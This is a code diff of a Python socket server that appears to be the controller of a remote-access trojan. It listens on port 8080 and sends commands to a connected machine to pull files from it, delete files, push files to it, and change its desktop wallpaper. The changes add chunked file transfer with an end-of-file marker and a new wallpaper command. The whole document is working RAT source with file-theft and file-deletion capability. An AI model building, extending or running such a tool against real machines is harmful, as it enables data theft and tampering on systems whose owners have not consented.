@@ -1,8 +1,10 @@
 import os
 import socket
+import ctypes
 
 s = socket.socket()
-host = socket.gethostname()
+#host = socket.gethostname()
+host = "0.0.0.0"
 port = 8080
 
 print("111111                               1111111111111")
@@ -69,18 +71,27 @@ while 1:
     elif command == "download_file":
         conn.send(command.encode())
         print("")
-        filepath = input(str("Please enter the file path including the filename : "))
+        filepath = input("Please enter the file path including the filename: ")
         conn.send(filepath.encode())
-        file = conn.recv(100000)
-        print("")
-        filename = input(str("Please enter a filename for the incoming file including the extension : "))
-        new_file = open(filename,"wb")
-        new_file.write(file)
-        new_file.close()
-        print("")
-        print(filename," Has been download and saved")
-        print("")
 
+        print("Receiving file...")
+        file_data = b""
+        while True:
+            chunk = conn.recv(4096)
+            if b"[END_OF_FILE]" in chunk:
+                file_data += chunk.replace(b"[END_OF_FILE]", b"")
+                break
+            file_data += chunk
+
+        print("")
+        filename = input("Please enter a filename to save the file (with extension): ")
+        with open(filename, "wb") as new_file:
+            new_file.write(file_data)
+
+        print("")
+        print(filename, "has been downloaded and saved successfully.")
+        print("")
+    
     elif command == "remove_file":
         conn.send(command.encode())
         fileanddir =  input(str("Please enter the filename and drectory :"))
@@ -90,17 +101,38 @@ while 1:
 
     elif command == "send_files":
         conn.send(command.encode())
-        file = input(str("Please enter the filename and directory of the file :"))
-        filename = input(str("Please enter the filename for the file being sent : "))
-        data = open(file,"rb")
-        file_data = data.read(7000)
+
+        # รับ path และชื่อไฟล์
+        file_path = input("Please enter the filename and directory of the file: ")
+        filename = input("Please enter the filename for the file being sent: ")
+
+        # ส่งชื่อไฟล์ให้ Client ก่อน
         conn.send(filename.encode())
-        print(file,"Has been sent successfully")
-        conn.send(file_data)
+
+        # เปิดและส่งไฟล์แบบ block
+        try:
+            with open(file_path, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    conn.send(chunk)
+            conn.send(b"[END_OF_FILE]")  # ✅ Marker บอกว่าไฟล์ส่งครบแล้ว
+            print(f"{file_path} has been sent successfully.")
+        except FileNotFoundError:
+            print("File not found.")
+            conn.send(b"[ERROR] File not found.")
+
 
     elif command == "sleep":
         conn.send(command.encode())
-        
+
+    elif command == "change_desktop":
+        conn.send(command.encode())
+        file_image = input(str("Enter file image path :"))
+        conn.send(file_image.encode())
+        print("sent change_desktop ok")
+        #data = open(file,"rb")
 
     else:
         print("")
